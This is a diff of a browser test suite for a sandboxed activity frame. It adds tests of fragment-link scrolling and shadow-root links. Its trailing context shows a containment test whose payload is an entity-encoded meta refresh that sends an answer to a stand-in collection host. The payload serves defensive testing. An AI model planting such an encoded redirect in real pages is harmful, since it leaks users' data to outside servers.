@@ -156,6 +156,42 @@ describe.each([["Chromium", chromium], ["WebKit", webkit]] as const)("published 
     } finally { await state.context.close(); }
   });
 
+  it("scrolls again when a fragment link the address already names is followed again", async () => {
+    // As in a browser, "#top" without such an element means the top of the page.
+    const state = await open(source.replace(
+      "<button",
+      '<div style="height:3000px"></div><a href="#top">Back to top</a><a href="#café">Café</a><div style="height:3000px"></div><p id="café">Café</p><button',
+    ));
+    try {
+      const frame = activity(state.page);
+      for (const attempt of [1, 2]) {
+        await frame.evaluate("scrollTo(0, 2500)");
+        await frame.getByRole("link", { name: "Back to top" }).click();
+        await expect.poll(() => frame.evaluate("scrollY"), { message: `attempt ${attempt}` }).toBe(0);
+      }
+      for (const attempt of [1, 2]) {
+        await frame.evaluate("scrollTo(0, 0)");
+        await frame.getByRole("link", { name: "Café" }).click();
+        await expect.poll(() => frame.evaluate("scrollY"), { message: `attempt ${attempt}` }).toBeGreaterThan(3000);
+      }
+      expect(await frame.locator("#answer").inputValue()).toBe("SYNTHETIC_ANSWER");
+      expect(state.external).toEqual([]);
+    } finally { await state.context.close(); }
+  });
+
+  it("keeps a fragment link inside an open shadow root inside the activity", async () => {
+    const state = await open(source.replace(
+      "<button",
+      '<div id="host"></div><div style="height:3000px"></div><p id="end">End</p><script>document.getElementById("host").attachShadow({ mode: "open" }).innerHTML = \'<a href="#end">Jump to end</a>\';</script><button',
+    ));
+    try {
+      await activity(state.page).getByRole("link", { name: "Jump to end" }).click();
+      await expect.poll(() => activity(state.page).evaluate("location.hash")).toBe("#end");
+      expect(await activity(state.page).locator("#answer").inputValue()).toBe("SYNTHETIC_ANSWER");
+      expect(state.external).toEqual([]);
+    } finally { await state.context.close(); }
+  });
+
   it.each(["location", "encoded refresh", "top location"])("contains %s without sending the answer outside", async (payload) => {
     const html = payload === "encoded refresh"
       ? source.replace("</head>", '<meta http-equiv="&#114;efresh" content="0;url=https://outside.invalid/collect?answer=SYNTHETIC_ANSWER"></head>')
